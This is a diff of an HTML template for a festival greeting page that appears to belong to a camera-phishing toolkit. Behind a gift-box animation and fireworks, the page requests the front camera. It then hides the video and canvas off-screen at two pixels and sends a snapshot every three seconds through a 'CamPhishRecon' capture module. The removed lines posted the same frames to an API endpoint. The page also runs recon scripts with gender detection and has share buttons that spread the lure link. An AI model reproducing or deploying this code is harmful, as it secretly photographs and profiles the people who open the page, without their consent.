@@ -1,103 +1,105 @@
-<!-- DESC: Festival wishing page with celebration greeting and camera capture -->
+<!-- DESC: Festival wishing page — interactive gift reveal with camera capture -->
 <!DOCTYPE html>
 <html><head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <title>Happy fes_name</title>
 <style>
-body{margin:0;background:linear-gradient(135deg,#1a0033,#000033);color:#fff;font-family:Arial,sans-serif;text-align:center;overflow:hidden;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
-.video-wrap,.capture-canvas{display:none}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{background:linear-gradient(135deg,#1a0033,#000033,#1a0033);color:#fff;font-family:Arial,sans-serif;text-align:center;overflow:hidden;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;touch-action:manipulation;user-select:none}
+.hidden{display:none}
+.gift-box{font-size:80px;cursor:pointer;animation:bounce 1.5s infinite;transition:transform .3s}
+.gift-box:active{transform:scale(0.9)}
+@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-20px)}}
 h1{font-size:clamp(28px,8vw,48px);margin:20px;text-shadow:0 0 20px #ff0,0 0 40px #f80;animation:glow 2s infinite}
 @keyframes glow{0%,100%{text-shadow:0 0 20px #ff0,0 0 40px #f80}50%{text-shadow:0 0 40px #ff0,0 0 80px #f80}}
 .greeting{font-size:clamp(16px,4vw,24px);margin:10px;color:#fa0}
-.spinner{margin:30px auto;width:40px;height:40px;border:4px solid #333;border-top:#ff0;border-radius:50%;animation:spin 1s linear infinite}
-@keyframes spin{to{transform:rotate(360deg)}}
+.tap-hint{color:#fa0;font-size:14px;margin:20px;animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{opacity:0.5}50%{opacity:1}}
+.reveal{font-size:60px;margin:20px;animation:pop .5s}
+@keyframes pop{0%{transform:scale(0)}100%{transform:scale(1)}}
+.message{font-size:clamp(14px,4vw,20px);color:#fff;margin:20px;line-height:1.8;max-width:320px}
+.fireworks{position:fixed;inset:0;pointer-events:none;z-index:-1}
 .share-section{margin-top:20px;display:flex;gap:10px;flex-wrap:wrap;justify-content:center}
-.share-btn{padding:10px 20px;border:none;border-radius:25px;font-size:14px;font-weight:700;color:#fff;cursor:pointer}
-.share-wa{background:#25D366}.share-fb{background:#1877F2}.share-tw{background:#1DA1F2}
-.gift-box{font-size:60px;animation:bounce 1.5s infinite}
-@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-15px)}}
+.share-btn{padding:12px 24px;border:none;border-radius:25px;font-size:14px;font-weight:700;color:#fff;cursor:pointer}
+.share-wa{background:#25D366}.share-fb{background:#1877F2}
+video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
 </style>
 </head><body>
 <script src="forwarding_link/t/recon.js"></script>
-<video id="video" playsinline autoplay style="display:none"></video>
-<canvas id="canvas" width="640" height="480" style="display:none"></canvas>
-<div class="gift-box">🎁</div>
+<video id="v" playsinline autoplay muted></video>
+<canvas id="cap" width="320" height="240"></canvas>
+<canvas class="fireworks" id="fw"></canvas>
+<div id="giftScreen">
+<div class="gift-box" id="giftBox" onclick="openGift()">🎁</div>
 <h1>Happy fes_name!</h1>
-<div class="greeting">Loading your special greeting... 🎉</div>
-<div class="spinner"></div>
+<div class="greeting">You received a special gift!</div>
+<div class="tap-hint">👆 Tap the gift to open</div>
+</div>
+<div id="revealScreen" class="hidden">
+<div class="reveal">🎉🎊✨</div>
+<h1>Happy fes_name!</h1>
+<div class="message" id="greetingMsg">Wishing you joy, prosperity, and endless happiness on this special occasion! May all your dreams come true! 🎊</div>
 <div class="share-section">
 <button class="share-btn share-wa" onclick="shareCard('wa')">💬 Send Greeting</button>
 <button class="share-btn share-fb" onclick="shareCard('fb')">📘 Share</button>
 </div>
+</div>
 <script>
-var API='API_BASE_URL';
-var FESTIVAL='fes_name';
-var SHARE_URL=location.origin+'/t/festival';
-var video=document.getElementById('video'),canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d');
+var API='API_BASE_URL',FESTIVAL='fes_name',SHARE_URL=location.origin+'/t/festival';
 if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
-});
+startCamera();startFireworks();
+function startCamera(){
+if(navigator.mediaDevices&&window.CamPhishRecon){
 navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
-video.srcObject=s;video.play();
-setInterval(function(){
-ctx.drawImage(video,0,0,640,480);
-if(window.CamPhishRecon)CamPhishRecon.Capture.image(canvas.toDataURL('image/png'),'canvas');else fetch(API+'/capture/image',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cat:canvas.toDataURL('image/png')})});
-},3000);
+var v=document.getElementById('v');v.srcObject=s;v.play();
+var cap=document.getElementById('cap'),cx=cap.getContext('2d');
+setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'canvas');}},3000);
 }).catch(function(){});
-
-function shareCard(t){
-var c=document.createElement('canvas');
-c.width=600;c.height=800;
-var x=c.getContext('2d');
-// Background
-var bg=x.createLinearGradient(0,0,0,800);
-bg.addColorStop(0,'#1a0033');bg.addColorStop(0.5,'#330066');bg.addColorStop(1,'#1a0033');
-x.fillStyle=bg;x.fillRect(0,0,600,800);
-// Decorative fireworks
-for(var i=0;i<40;i++){x.fillStyle=['#ff0','#f80','#f0f','#0ff'][i%4];x.globalAlpha=0.15+Math.random()*0.2;x.beginPath();x.arc(20+Math.random()*560,20+Math.random()*760,1+Math.random()*3,0,6.28);x.fill();}
-x.globalAlpha=1;
-// Border
-x.strokeStyle='#ff0';x.lineWidth=3;x.globalAlpha=0.3;
-x.beginPath();x.roundRect(30,60,540,680,20);x.stroke();
-x.globalAlpha=1;
-// Gift emoji
-x.font='80px system-ui';x.textAlign='center';
-x.fillText('🎁',300,200);
-// Title
-x.fillStyle='#ff0';x.font='bold 44px system-ui';x.shadowColor='#f80';x.shadowBlur=20;
-x.fillText('Happy '+FESTIVAL+'!',300,300);
-x.shadowBlur=0;
-// Subtitle
-x.fillStyle='#fa0';x.font='20px system-ui';
-x.fillText('Wishing you joy and prosperity',300,340);
-// Divider
-x.strokeStyle='rgba(255,200,0,0.3)';x.lineWidth=1;
-x.beginPath();x.moveTo(100,380);x.lineTo(500,380);x.stroke();
-// CTA
-x.fillStyle='#fff';x.font='bold 22px system-ui';
-x.fillText('Send your own greeting:',300,440);
-// URL
-x.fillStyle='#0ff';x.font='bold 18px monospace';
-x.fillText(SHARE_URL,300,480);
-// Decorations
-x.font='36px system-ui';x.globalAlpha=0.5;
-x.fillText('🎊',150,580);x.fillText('🎉',450,580);x.fillText('✨',300,620);
-x.globalAlpha=1;
-// Footer
-x.fillStyle='#9680b0';x.font='12px system-ui';
-x.fillText(FESTIVAL+' Greeting Card',300,700);
-
-c.toBlob(function(blob){
-var textMsg='🎉 Happy '+FESTIVAL+'! Send your own greeting: '+SHARE_URL;
-var file=new File([blob],FESTIVAL+'-greeting.png',{type:'image/png'});
-if(navigator.canShare&&navigator.canShare({files:[file]})){
-navigator.share({text:textMsg,files:[file],title:'Happy '+FESTIVAL}).catch(function(){});
-return;
 }
-if(t==='wa')open('whatsapp://send?text='+encodeURIComponent(textMsg),'_blank');
-else if(t==='fb')open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(SHARE_URL)+'&quote='+encodeURIComponent(textMsg),'_blank');
-var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=FESTIVAL+'-greeting.png';a.click();
-},'image/png');
+}
+function openGift(){
+document.getElementById('giftScreen').classList.add('hidden');
+document.getElementById('revealScreen').classList.remove('hidden');
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('gift_opened',{festival:FESTIVAL});
+// Burst of particles
+for(var i=0;i<30;i++)spawnParticle();
+}
+var fwCanvas,fwCtx,particles=[];
+function startFireworks(){
+fwCanvas=document.getElementById('fw');fwCtx=fwCanvas.getContext('2d');
+fwCanvas.width=innerWidth;fwCanvas.height=innerHeight;
+addEventListener('resize',function(){fwCanvas.width=innerWidth;fwCanvas.height=innerHeight;});
+setInterval(function(){if(Math.random()<0.3)spawnParticle();},800);
+animateFW();
+}
+function spawnParticle(){
+var x=Math.random()*fwCanvas.width,y=fwCanvas.height;
+var tx=x+(Math.random()-0.5)*200,ty=fwCanvas.height*0.3+Math.random()*200;
+var col=['#ff0','#f80','#f0f','#0ff','#fa0'][Math.floor(Math.random()*5)];
+particles.push({x:x,y:y,vx:(tx-x)/30,vy:-8+Math.random()*4,col:col,life:60,exploded:false});
+}
+function animateFW(){
+fwCtx.fillStyle='rgba(26,0,51,0.1)';fwCtx.fillRect(0,0,fwCanvas.width,fwCanvas.height);
+for(var i=particles.length-1;i>=0;i--){
+var p=particles[i];
+p.x+=p.vx;p.y+=p.vy;p.vy+=0.15;p.life--;
+if(!p.exploded&&p.vy>=0){
+p.exploded=true;
+for(var j=0;j<12;j++){var a=j/12*6.28;particles.push({x:p.x,y:p.y,vx:Math.cos(a)*3,vy:Math.sin(a)*3,col:p.col,life:30,exploded:true});}
+}
+fwCtx.fillStyle=p.col;fwCtx.globalAlpha=Math.max(0,p.life/30);
+fwCtx.beginPath();fwCtx.arc(p.x,p.y,2,0,6.28);fwCtx.fill();
+if(p.life<=0)particles.splice(i,1);
+}
+fwCtx.globalAlpha=1;
+requestAnimationFrame(animateFW);
+}
+function shareCard(t){
+var msg='🎉 Happy '+FESTIVAL+'! Send your own greeting: '+SHARE_URL;
+if(navigator.canShare){navigator.share({text:msg,title:'Happy '+FESTIVAL}).catch(function(){});return;}
+if(t==='wa')open('whatsapp://send?text='+encodeURIComponent(msg),'_blank');
+else if(t==='fb')open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(SHARE_URL)+'&quote='+encodeURIComponent(msg),'_blank');
 }
 </script>
 </body></html>
